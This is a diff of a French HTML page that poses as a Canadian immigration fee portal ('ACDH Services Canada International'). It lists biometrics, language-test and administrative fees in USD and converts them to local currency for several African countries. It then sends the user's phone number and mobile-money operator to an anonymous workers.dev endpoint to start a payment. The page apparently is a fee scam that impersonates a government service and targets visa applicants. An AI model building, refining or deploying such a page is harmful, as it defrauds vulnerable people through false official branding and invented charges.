@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-<title>Paiement Frais Service Canada</title>
+<meta charset="UTF-8">
+<title>Paiement ACDH</title>
 
 <style>
 body {
@@ -14,19 +15,33 @@ body {
   justify-content:center;
   align-items:center;
   height:100vh;
+  margin:0;
 }
 
+/* animation */
 .box {
   background:white;
   padding:30px;
   border-radius:12px;
-  width:340px;
+  width:360px;
   text-align:center;
+  animation: fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn {
+  from {opacity:0; transform:translateY(20px);}
+  to {opacity:1; transform:translateY(0);}
 }
 
 .logo {
   width:120px;
-  margin-bottom:10px;
+  margin-bottom:5px;
+}
+
+.title {
+  font-size:18px;
+  font-weight:bold;
+  margin-bottom:15px;
 }
 
 input, select {
@@ -37,6 +52,7 @@ input, select {
   border:1px solid #ccc;
 }
 
+/* prefix + numero */
 .row {
   display:flex;
   gap:5px;
@@ -54,17 +70,39 @@ input, select {
 button {
   width:100%;
   padding:12px;
-  margin-top:12px;
+  margin-top:15px;
   background:#00bcd4;
   color:white;
   border:none;
   border-radius:6px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+button:hover {
+  background:#0097a7;
+}
+
+/* montant */
+.amount-box {
+  margin-top:10px;
   font-weight:bold;
 }
 
 #result {
   margin-top:15px;
   font-weight:bold;
+}
+
+/* footer */
+.footer {
+  position:absolute;
+  bottom:10px;
+  color:white;
+  font-size:12px;
+  text-align:center;
+  width:100%;
 }
 </style>
 </head>
@@ -75,9 +113,17 @@ button {
 
 <img src="logo.png" class="logo">
 
-<h2>Paiement ACDH</h2>
+<div class="title">Service Immigration Paiement</div>
 
-<select id="country" onchange="updateOperators()">
+<!-- SERVICES -->
+<select id="service" onchange="updateAmount()">
+  <option value="150">Données biométriques - 150 USD</option>
+  <option value="150">Test de langue - 150 USD</option>
+  <option value="220">Droit administratif - 220 USD</option>
+  <option value="520">Tout payer - 520 USD</option>
+</select>
+
+<select id="country" onchange="updateOperators(); updateAmount()">
   <option value="CIV">Côte d'Ivoire</option>
   <option value="CMR">Cameroun</option>
   <option value="COD">RDC</option>
@@ -94,7 +140,8 @@ button {
   <input id="phone" class="phone" placeholder="Numéro">
 </div>
 
-<input type="number" id="amount" placeholder="Montant">
+<!-- montant auto -->
+<div class="amount-box" id="displayAmount"></div>
 
 <button onclick="payer()">Payer</button>
 
@@ -102,15 +149,39 @@ button {
 
 </div>
 
+<div class="footer">
+© 2026 ACDH Services Canada International — Plateforme sécurisée 🔒
+</div>
+
 <script>
+
+// 💳 services USD
+const services = {
+  "150":150,
+  "220":220,
+  "520":520
+};
+
+// 🌍 taux (approx)
+const rates = {
+  XOF: 600,
+  XAF: 600,
+  CDF: 2500
+};
+
+const currencies = {
+  BEN:"XOF", CIV:"XOF", SEN:"XOF",
+  CMR:"XAF", GAB:"XAF", COG:"XAF",
+  COD:"CDF"
+};
 
 const operators = {
   BEN:["MTN","MOOV"],
   CIV:["MTN","ORANGE"],
   CMR:["MTN"],
   COD:["AIRTEL","ORANGE","VODACOM"],
-  COG:["AIRTEL","MTN"],
   GAB:["AIRTEL"],
+  COG:["AIRTEL","MTN"],
   SEN:["ORANGE","FREE"]
 };
 
@@ -124,59 +195,59 @@ const prefixes = {
   SEN:"221"
 };
 
+// update opérateurs + indicatif
 function updateOperators(){
-
   operator.innerHTML="";
-
-  operators[country.value].forEach(op=>{
-    let option=document.createElement("option");
-    option.value=op;
-    option.text=op;
-    operator.appendChild(option);
+  operators[country.value].forEach(o=>{
+    let opt=document.createElement("option");
+    opt.value=o;
+    opt.textContent=o;
+    operator.appendChild(opt);
   });
-
   prefix.value = prefixes[country.value];
 }
 
-updateOperators();
+// montant auto
+function updateAmount(){
 
+  const usd = parseInt(service.value);
+  const cur = currencies[country.value];
+
+  const amount = usd * rates[cur];
+
+  displayAmount.innerText = "Montant à payer : " + amount + " " + cur;
+}
+
+// paiement
 async function payer(){
 
-  const result = document.getElementById("result");
-
-  result.innerText="⏳ Envoi...";
+  result.innerText="⏳ Traitement...";
 
   const fullPhone = prefix.value + phone.value;
 
-  try{
+  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      phone: fullPhone,
+      amount: service.value,
+      country: country.value,
+      operator: operator.value
+    })
+  });
 
-    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        phone: fullPhone,
-        amount: amount.value,
-        country: country.value,
-        operator: operator.value
-      })
-    });
+  const data = await res.json();
 
-    const data = await res.json();
-
-    if(data.status==="ACCEPTED"){
-      result.innerText="📲 Vérifiez votre téléphone";
-    } else if(data.status==="PENDING"){
-      result.innerText="⏳ En attente...";
-    } else if(data.status==="SUCCESS"){
-      result.innerText="✅ Paiement confirmé";
-    } else {
-      result.innerText="❌ Échec";
-    }
-
-  }catch{
-    result.innerText="❌ Erreur réseau";
-  }
+  result.innerText =
+    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
+    data.status==="PENDING"?"⏳ En attente":
+    data.status==="SUCCESS"?"✅ Paiement confirmé":
+    "❌ Échec";
 }
+
+// init
+updateOperators();
+updateAmount();
 
 </script>
 
